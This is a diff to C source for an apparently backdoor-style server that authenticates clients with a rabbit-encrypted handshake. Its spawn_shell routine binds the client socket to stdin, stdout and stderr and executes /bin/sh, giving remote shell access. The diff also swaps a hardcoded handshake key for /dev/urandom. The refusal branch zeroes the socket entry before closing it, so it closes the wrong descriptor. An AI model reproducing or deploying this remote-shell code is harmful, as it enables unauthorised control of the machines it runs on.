@@ -118,14 +118,13 @@ int setup_server(int *master_sd, int *clients_sockets, struct sockaddr_in *serve
 
 int generate_key(char *key)
 {
-	//int fd = 0;
+	int fd = 0;
 
 	memset(key, 0, 17);
-	/*if ((fd = open("/dev/urandom", O_RDONLY)) < 0)
+	if ((fd = open("/dev/urandom", O_RDONLY)) < 0)
 		return -1;
 	if (read(fd, key, 16) < 0)
-		return -1;*/
-	strcpy(key, "abcdefghijklmnop");
+		return -1;
 	key[16] = 0;
 	return 0;
 }
@@ -166,7 +165,6 @@ int handle_connexions(int *master_sd, fd_set *readfds, int *clients_sockets)
 			return 1;
 		//inform user of socket number - used in send and receive commands 
 		//printf("New connection , socket fd is %d , ip is : %s , port : %d\n", new_socket, inet_ntoa(client_address.sin_addr), ntohs(client_address.sin_port));  
-
 		if (generate_key(handshake))
 		{
 			printf("error generating random handshake\n");
@@ -182,28 +180,20 @@ int handle_connexions(int *master_sd, fd_set *readfds, int *clients_sockets)
 			return -1;
 		}
 		buffer[16] = 0;
-		//printf("sent handshake %s\n", handshake);
 		if (rabbit(handshake, KEY, IV))
 		{
 			printf("error encrypting handshake\n");
 			close(*master_sd);
 			return -1;
 		}
-		//printf("%s:%ld %s:%ld\n", buffer, strlen(buffer), handshake, strlen(handshake));
 		if (strcmp(buffer, handshake))
 		{
 			send(clients_sockets[i], conn_refused_msg, strlen(conn_refused_msg), 0);
 			clients_sockets[i] = 0;
 			close(clients_sockets[i]);
-			//printf("crypt handshake %s\n", handshake);
-			//printf("rcvd handshake: %s\n", buffer);
-			//printf("Connexion refused message sent successfully\n");  
 			return 1;
 		}
-		//printf("crypt handshake %s\n", handshake);
-		//printf("rcvd handshake: %s\n", buffer);
 		send(clients_sockets[i], welcome_msg, strlen(welcome_msg), 0);
-		//printf("Welcome message sent successfully\n");  
 	}
 	return 0;
 }
@@ -224,7 +214,6 @@ int spawn_shell(int *clients_sockets)
 		dup2(*clients_sockets, 0);
 		dup2(*clients_sockets, 1);
 		dup2(*clients_sockets, 2);
-		//close(*clients_sockets);
 		*clients_sockets = -*clients_sockets;
 		char * const argv[] = {"/bin/sh", NULL};
 		execve("/bin/sh", argv, NULL);
